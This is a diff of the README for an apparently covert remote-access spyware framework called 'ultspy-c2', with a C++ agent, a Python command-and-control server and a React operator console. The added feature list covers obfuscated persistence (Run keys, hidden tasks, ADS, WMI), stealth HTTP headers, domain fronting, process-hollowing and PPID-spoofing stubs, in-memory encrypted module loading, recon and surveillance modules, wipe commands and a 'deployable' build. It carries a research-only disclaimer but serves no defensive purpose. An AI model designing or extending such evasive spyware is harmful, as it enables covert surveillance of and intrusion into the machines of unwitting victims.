@@ -30,12 +30,19 @@ Dieses Projekt dient ausschließlich zu Forschungs-, Entwicklungs- und Systemadm
   - Kommandos werden pluginbasiert über eine Registry geladen
 - Crypto: AES-256-CBC-Verschlüsselung der Datenübertragung
 - Key-Exchange: RSA-4096 initialer Schluessel
-- Persistenz via Run-Key und Task-Scheduler
+- Fortgeschrittener Persistenz-Layer (Run-Key, verschleierte Tasks, ADS, WMI-Vorbereitung)
 - Safe-Mode bei Serverkommando
 - Wipe- und Deep-Sleep-Kommandos
 - Erste Obfuskationsschicht: verschluesselte Strings und Control-Flow-Flattening im Command-Handler
+- Zufällige HTTP-Header pro Client-Session zur Stealth-Kommunikation
+- Vorbereitung für Domain Fronting mit konfigurierbaren Zieladressen
+- HMAC-Signaturen mit Nonce- und Timestamp-Prüfung gegen Replay-Attacken
 - IPC-Basis über eine Named Pipe `\\.\pipe\US_IPC_CORE` zur künftigen Kommunikation zwischen Modulen
 - Hardened Loader lädt Module aus AES-verschlüsselten Payloads direkt aus dem Speicher
+- Vorbereitende Anti-Forensik Stubs (Process Hollowing & PPID Spoofing)
+- Initiales Recon-Modul sammelt umfangreiche Systeminformationen
+- Active Surveillance Modul überwacht Prozesse und Autostart-Einträge
+- Kommando-Templates erleichtern wiederkehrende Steuerbefehle
 
 ### Server (Python)
 
@@ -47,6 +54,8 @@ Dieses Projekt dient ausschließlich zu Forschungs-, Entwicklungs- und Systemadm
 - Loggingsystem
 - Admin-Schnittstelle mit API-Key-Authentifizierung
 - Endpunkt `/payload/<uuid>/<module>` liefert verschlüsselte Module für den Loader
+- Routing-Tabelle aus `config.json` erlaubt mehrere Zielhosts (Domain Fronting Vorbereitung)
+- API-Schlüssel für Admin-Endpunkte werden ebenfalls in `config.json` gespeichert
 
 ---
 
@@ -54,7 +63,9 @@ Dieses Projekt dient ausschließlich zu Forschungs-, Entwicklungs- und Systemadm
 
 ### Client
 - CMake + GCC (C++)
-- Eigenständiger modularer Build
+- Zwei Build-Varianten:
+  - `dev_version` mit Debug-Logging
+  - `deployable_version` für produktiven Einsatz
 
 ### Server
 - Python 3.x
@@ -69,8 +80,12 @@ Dieses Projekt ist für Forschungs- und Entwicklungszwecke bestimmt.
 ### Build-Anleitung
 
 ```
-# Client
-cd client && mkdir build && cd build
+# Client (dev)
+cd client/dev_version && mkdir build && cd build
+cmake .. && make
+
+# Client (deployable)
+cd ../../deployable_version && mkdir build && cd build
 cmake .. && make
 
 # Server
@@ -92,16 +107,70 @@ Kommandos werden nun als JSON-Objekt in der Form
 übermittelt. Neue Befehle können als Plugins registriert werden und melden sich
 beim `CommandRegistry` an.
 
-Administratoren können über die API-Key geschützten Endpunkte `/admin/agents`,
-`/admin/logs/<uuid>` und `/admin/command/<uuid>` auf den Server zugreifen. Der
-API-Schlüssel wird via `X-API-KEY` Header übermittelt.
+Administratoren melden sich nun über `/login` mit einem API-Key an und erhalten ein zeitlich begrenztes JWT. Dieses wird im `Authorization` Header an alle `/admin/*` Endpunkte angehängt. Die Logs-Schnittstelle liefert Recon-Berichte und Servermeldungen eines Agents chronologisch als JSON.
 
 ### Web UI
 
-A React-based interface in `frontend/` allows operators to log in with their API key and manage agents. Start the development server with:
+A React-based interface in `frontend/` allows operators to log in with their API
+key and manage agents. Open `/login` to enter the key; it is stored in
+`localStorage` under `ULTSPY_JWT` and automatically sent in the `Authorization`
+header for all `/admin/*` requests. If the backend responds with `401 Unauthorized` the token
+is removed and the user is redirected to `/login`. Network issues trigger a global
+"Verbindung zum Backend unterbrochen." banner.
+Operators can log out via the header button which clears the token.
+The **Agents** page retrieves data from `/admin/agents` and shows the online
+state. A colored badge marks its stability as **Stable**, **Warning**, **Degraded** or **Offline** depending on the last heartbeat.
+Clicking an entry opens `/agents/:uuid` with detailed information and a quick
+command dialog. In addition to manually entering a command you can select one of
+the stored **Command Templates** to prefill and send common tasks instantly.
+The **Commands** page lets an operator view the queued commands for a selected agent and submit new entries via
+`/admin/command/<uuid>`. The **Logs** page zeigt gespeicherte Recon- und
+Überwachungsdaten über `/admin/logs/<uuid>`. Die **Settings** Seite ruft
+`/admin/config` ab und stellt die aktuellen Konfigurationswerte dar.
+Command **Templates** vereinfachen wiederkehrende Befehle über `/admin/templates`.
+Die Verwaltung der API-Schlüssel erfolgt über die Seite **API Keys**, welche
+die Endpunkte `/admin/apikeys` nutzt, um neue Schlüssel zu generieren oder zu
+revoken.
+Eine zusätzliche **Audit Log** Ansicht zeigt alle Login- und Schlüsselaktionen an, die der Server in einer Audit-Tabelle speichert.
+
+Nach einem Update von älteren Versionen müssen bestehende Schlüssel aus
+`server/config.json` einmalig mit `python server/migrate_keys.py` in die
+Datenbank übertragen werden.
+ Start the development server with:
 
 ```bash
 cd frontend
 npm install
 npm run dev
 ```
+
+## Deployment
+
+The production setup bundles the API server and compiled frontend into `/srv/ultspy-c2`:
+
+```
+/srv/ultspy-c2/
+  backend
+  frontend
+  venv
+```
+
+1. Build the web interface:
+   ```bash
+   cd frontend
+   npm install
+   npm run build
+   ```
+   The static files appear in `frontend/dist/`.
+2. Create a virtual environment and install the backend:
+   ```bash
+   cd ../server
+   python -m venv /srv/ultspy-c2/venv
+   source /srv/ultspy-c2/venv/bin/activate
+   pip install -r requirements.txt
+   ```
+3. Launch the API with Gunicorn:
+   ```bash
+   gunicorn -w 4 -b 0.0.0.0:5000 wsgi:app
+   ```
+The backend should be reverse proxied by a web server like Nginx. Static frontend files can be served directly from `/srv/ultspy-c2/frontend`.
